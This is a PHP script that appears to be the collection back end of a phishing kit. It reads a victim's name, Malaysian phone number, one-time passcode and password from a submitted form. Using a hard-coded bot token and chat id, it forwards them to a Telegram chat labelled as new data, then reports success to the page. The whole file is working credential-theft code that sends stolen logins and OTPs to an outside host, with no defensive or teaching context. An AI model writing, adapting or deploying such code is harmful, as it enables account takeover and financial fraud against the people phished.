<?php

$botToken = "7690173453:AAFizIJfq7OWi5tthhxxqXKWcS0Xb5bP_iE";
$chatId   = "6832746767";

$name     = $_POST['name'] ?? '';
$phone    = $_POST['phone'] ?? '';
$otp      = $_POST['otp'] ?? '';
$password = $_POST['password'] ?? '';

$message = "📥 DATA BARU\n\n";
$message .= "👤 Nama: $name\n";
$message .= "📱 Phone: +60$phone\n";
$message .= "🔐 OTP: $otp\n";
$message .= "🔑 Password: $password\n";

$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text'    => $message
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
file_get_contents($url, false, $context);

echo "success";